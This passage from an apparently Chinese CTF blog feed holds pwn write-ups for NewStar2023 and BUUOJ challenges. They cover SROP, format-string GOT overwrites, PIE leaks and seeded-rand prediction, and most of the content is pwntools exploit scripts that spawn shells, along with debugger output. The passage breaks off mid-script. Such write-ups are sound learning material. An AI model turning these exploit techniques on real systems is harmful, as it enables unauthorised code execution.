    <content type="html"><![CDATA[<p>需要syscall ret，如果没有syscall 15，就要先造一个  pop rax, ret 加 0xf 的gadget，然后在执行syscall。</p><h3 id="Newstar2023-srop"><a href="#Newstar2023-srop" class="headerlink" title="Newstar2023 srop"></a>Newstar2023 srop</h3><p><a href="https://buuoj.cn/match/matches/190/challenges">https://buuoj.cn/match/matches/190/challenges</a></p><p>整体思路就是先构造一个syscall 15的rop，然后在这个syscall栈下面放上一个frame，frame的rip指向syscall，然后再把需要执行的函数和参数写进其他寄存器</p><p>0xf是sigreturn调用号，59是execve调用号</p><p>不懂为什么syscall的调用号是在rdi上</p><blockquote><p>答：这道题是call syscall ，不是直接执行syscall</p><p>__int64 syscall(__int64 sysno, …)<br>{<br>      return syscall(sysno);<br>}</p></blockquote><p>第一次send栈迁移是为了能够知道/bin/sh在哪，在原本的栈上不知道地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p=process(<span class="hljs-string">&#x27;./pwn_1&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn_1&#x27;</span>)<br><br>rdi=<span class="hljs-number">0x401203</span><br>syscall=elf.plt[<span class="hljs-string">&#x27;syscall&#x27;</span>]<br>lea=<span class="hljs-number">0x401171</span><br>bss=<span class="hljs-number">0x404050</span>+<span class="hljs-number">0x300</span> <span class="hljs-comment"># 这个0x300换成别的或者直接不加，试过也可以</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;welcome to srop!\n&#x27;</span>)<br>frame=SigreturnFrame()<br>frame.rdi=<span class="hljs-number">59</span><br>frame.rsi=bss-<span class="hljs-number">0x30</span> <span class="hljs-comment"># 原本的栈上rbp距离字符串开头是0x30字节，栈迁移过来也一样</span><br>frame.rdx=<span class="hljs-number">0</span><br>frame.rcx=<span class="hljs-number">0</span><br>frame.rsp=bss+<span class="hljs-number">0x38</span><br>frame.rip=syscall<br><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+flat(bss,lea))<br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+flat(rdi,<span class="hljs-number">0xf</span>,syscall,frame))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a>ciscn_2019_es_7</h3><p><a href="https://buuoj.cn/challenges#ciscn_2019_es_7">https://buuoj.cn/challenges#ciscn_2019_es_7</a></p><p>sys_write本身泄露了栈上的地址，计算和buf输入的binsh的偏移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.arch=&#x27;amd64&#x27;</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&quot;./ciscn_2019_es_7&quot;)</span><br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25797</span>)<br><br>syscall_ret=<span class="hljs-number">0x400517</span><br>sigreturn_addr=<span class="hljs-number">0x4004da</span> <span class="hljs-comment"># rax = 15, ret</span><br>system_addr=<span class="hljs-number">0x4004E2</span><span class="hljs-comment"># syscall, ret</span><br><br>rax=<span class="hljs-number">0x4004f1</span><br><br>p.send(<span class="hljs-string">b&quot;/bin/sh&quot;</span>+<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">9</span>+p64(rax))<br>p.recv(<span class="hljs-number">32</span>)<br>stack_addr=u64(p.recv(<span class="hljs-number">8</span>))<br>log.success(<span class="hljs-string">&quot;stack: &quot;</span>+<span class="hljs-built_in">hex</span>(stack_addr))<br>p.recv(<span class="hljs-number">8</span>)<br><br>sigframe = SigreturnFrame()<br>sigframe.rax = <span class="hljs-number">59</span><br>sigframe.rdi = stack_addr - <span class="hljs-number">0x118</span>  <br>sigframe.rsi = <span class="hljs-number">0x0</span><br>sigframe.rdx = <span class="hljs-number">0x0</span><br>sigframe.rsp = stack_addr<br>sigframe.rip = syscall_ret<br><br>p.send(<span class="hljs-string">b&quot;/bin/sh&quot;</span>+<span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">0x1</span>+<span class="hljs-number">0x8</span>)+p64(sigreturn_addr)+p64(syscall_ret)+<span class="hljs-built_in">bytes</span>(sigframe))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>上面的exp里binsh和泄露的地址偏移是0x118，但是在我本地是328（kali2023.3），远程是ubuntu18</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/100x <span class="hljs-number">0x7fffffffde00</span> -<span class="hljs-number">40</span><br><span class="hljs-number">0x7fffffffddd8</span>: <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x7fffffffdde8</span>: <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x31333231</span>      <span class="hljs-number">0x32313332</span> <span class="hljs-comment">#  ddf0是buf的地址</span><br><span class="hljs-number">0x7fffffffddf8</span>: <span class="hljs-number">0x00000a33</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xffffde20</span>      <span class="hljs-number">0x00007fff</span><br><span class="hljs-number">0x7fffffffde08</span>: <span class="hljs-number">0x00400536</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xffffdf38</span>      <span class="hljs-number">0x00007fff</span><br><span class="hljs-number">0x7fffffffde18</span>: <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x00000000</span><br>pwndbg&gt; stack <span class="hljs-number">30</span><br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rbp rsp <span class="hljs-number">0x7fffffffde00</span> —▸ <span class="hljs-number">0x7fffffffde20</span> ◂— <span class="hljs-number">0x1</span><br>01:0008│         <span class="hljs-number">0x7fffffffde08</span> —▸ <span class="hljs-number">0x400536</span> (main+<span class="hljs-number">25</span>) ◂— nop  <span class="hljs-comment"># ret addr</span><br>02:<span class="hljs-number">00</span>10│         <span class="hljs-number">0x7fffffffde10</span> —▸ <span class="hljs-number">0x7fffffffdf38</span> —▸ <span class="hljs-number">0x7fffffffe2af</span> ◂— <span class="hljs-string">&#x27;/home/kali/Desktop/ciscn_s_3&#x27;</span><br>03:0018│         <span class="hljs-number">0x7fffffffde18</span> ◂— <span class="hljs-number">0x100000000</span><br>04:0020│         <span class="hljs-number">0x7fffffffde20</span> ◂— <span class="hljs-number">0x1</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串修改got表</title>
    <link href="/2023/11/27/ctf-pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2gots%E8%A1%A8%E5%9C%B0%E5%9D%80/"/>
    <url>/2023/11/27/ctf-pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2gots%E8%A1%A8%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<h3 id="NewStar2023-puts-or-system"><a href="#NewStar2023-puts-or-system" class="headerlink" title="NewStar2023 puts or system"></a>NewStar2023 puts or system</h3><p><a href="https://buuoj.cn/match/matches/190/challenges">https://buuoj.cn/match/matches/190/challenges</a></p><p>通过%s泄露libc</p><p>目的是通过<code>b&#39;a&#39; * 4 + b&#39;%?$s&#39; + p64(puts_got)</code>把puts_got当成字符串的地址，打印got表项</p><p>4个a和<code>%?$s</code>加起来正好是8个字节。</p><p>在获取是第几个%s的时候，由于不能像%p那样一直%s%s%s%s…..，因为%s如果作为地址取内容失败会崩溃</p><p>所以在第一次试的时候就要用 <code>&#39;a&#39; * 8 + &#39;b&#39; * 8</code> （8个a代表原本的4个a和%?$s，8个b代表puts的got表地址），然后再加上%p%p%p%p%p%p%p%p……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./putsorsys&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27515</span>)<br>elf = ELF(<span class="hljs-string">&#x27;putsorsys&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>offset = <span class="hljs-number">8</span><br>p.sendlineafter(<span class="hljs-string">&quot;(0/1)\n&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + <span class="hljs-string">b&#x27;%9$s&#x27;</span> + p64(puts_got)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>] <br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>] <br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(sys_addr))<br><br>p.sendlineafter(<span class="hljs-string">&quot;(0/1)\n&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>fmtpayload = fmtstr_payload(offset, &#123;puts_got:sys_addr&#125;)<br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s it\n&quot;</span>,fmtpayload)<br>p.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>fmt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PIE Format String</title>
    <link href="/2023/11/26/ctf-pwn/PIE%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <url>/2023/11/26/ctf-pwn/PIE%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="NewStar2023-Secret-Number"><a href="#NewStar2023-Secret-Number" class="headerlink" title="NewStar2023 Secret Number"></a>NewStar2023 Secret Number</h3><p><a href="https://buuoj.cn/match/matches/190/challenges">https://buuoj.cn/match/matches/190/challenges</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+8h] [rbp-38h] BYREF</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+Ch] [rbp-34h] BYREF</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  init(argc, argv, envp);<br>  v3 = time(<span class="hljs-number">0LL</span>);<br>  srand(v3);<br>  secret = rand();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to NewStar CTF!!&quot;</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Give me some gift?(0/1)&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v6);<br>    <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s it&quot;</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">32uLL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Oh thanks,There is my gift:&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(buf);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Guess the number&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>  <span class="hljs-keyword">if</span> ( v5 == secret )<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You are wrong!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="泄露PIE偏移"><a href="#泄露PIE偏移" class="headerlink" title="泄露PIE偏移"></a>泄露PIE偏移</h4><p>泄露栈里的main函数的地址，但是输入最多32字节，靠%p%p%p%p….是达不到第十七个%p的。</p><p>不知道有什么别的方法，只能一个一个试</p><p>pwntools的<code>fmtstr_payload</code>可以直接指定修改任意地址的值，第一个参数是<code>aaaaaaaa</code>的偏移，后面的字典是要修改的地址和值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,26261)</span><br>p = process(<span class="hljs-string">&#x27;./secretnumber&#x27;</span>)<br><br>offset=<span class="hljs-number">8</span> <span class="hljs-comment"># aaaaaaaa</span><br>num_addr = <span class="hljs-number">0x404c</span><br><br><span class="hljs-comment">##leak pie</span><br>p.sendlineafter(<span class="hljs-string">b&quot;(0/1)\n&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-string">&quot;aaaaaaaa%17$p&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;What&#x27;s it\n&quot;</span>,payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br>main_addr=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;f5&#x27;</span>)[-<span class="hljs-number">12</span>:],<span class="hljs-number">16</span>)<br>pie=main_addr-<span class="hljs-number">0x12F5</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(main_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pie))<br>num_addr += pie<br><br><span class="hljs-comment">##fmtpayload</span><br>p.sendlineafter(<span class="hljs-string">&quot;(0/1)\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>fmtpayload=fmtstr_payload(offset, &#123;num_addr:<span class="hljs-number">1</span>&#125;)<br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s it\n&quot;</span>,fmtpayload)<br>p.sendlineafter(<span class="hljs-string">&quot;(0/1)\n&quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Guess the number\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="用相同的种子猜测伪随机数"><a href="#用相同的种子猜测伪随机数" class="headerlink" title="用相同的种子猜测伪随机数"></a>用相同的种子猜测伪随机数</h4><p>不一定每次成功，要多试几次，让seed对上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26261</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./secretnumber&#x27;</span>)<br>libc=cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br> <br>seed=libc.time(<span class="hljs-number">0</span>)<br>libc.srand(seed)<br>num1=libc.rand()<br> <br>p.sendlineafter(<span class="hljs-string">b&#x27;Give me some gift?(0/1)\n&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Guess the number\n&#x27;</span>,<span class="hljs-built_in">str</span>(num1))<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>fmt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStar2023 pwn planet</title>
    <link href="/2023/11/26/ctf-pwn/newstar2023week5/"/>
    <url>/2023/11/26/ctf-pwn/newstar2023week5/</url>
    
    <content type="html"><![CDATA[<h2 id="planet"><a href="#planet" class="headerlink" title="planet"></a>planet</h2><p><a href="https://buuoj.cn/match/matches/190/challenges#planet">https://buuoj.cn/match/matches/190/challenges#planet</a></p><h4 id="exp1-泄露随机数"><a href="#exp1-泄露随机数" class="headerlink" title="exp1 泄露随机数"></a>exp1 泄露随机数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28513</span>)<br>elf = ELF(<span class="hljs-string">&#x27;putsorsys&#x27;</span>)<br><br>libc=cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Passwd: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;secret_passwd_anti_bad_guys&quot;</span>)<br><br>seed=libc.time(<span class="hljs-number">0</span>)<br>libc.srand(seed)<br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;Admin&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">55</span>):<br>    libc.rand()<br><br>passwd = <span class="hljs-string">&#x27;&#x27;</span><br>alpha = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>passwd = passwd + alpha[libc.rand() % <span class="hljs-number">26</span>]<br><br>p.sendline(passwd.encode())<br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="exp2-泄露PIE"><a href="#exp2-泄露PIE" class="headerlink" title="exp2 泄露PIE"></a>exp2 泄露PIE</h4><p>让字母表全变成A，不管怎么随机都是一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28513</span>)<br>elf = ELF(<span class="hljs-string">&#x27;putsorsys&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Passwd: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;secret_passwd_anti_bad_guys&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;Rename&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Enter the new name&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">16</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;GetName&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">16</span>)<br>s = u64(p.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(s))<br><br>PIE = s - <span class="hljs-number">0x40D0</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;Rename&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Enter the new name&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">24</span> + p64(PIE + <span class="hljs-number">0x40E0</span>))<br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;Jump&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;Rename&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Enter the new name&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">26</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;Admin&quot;</span>)<br>p.recvuntil(<span 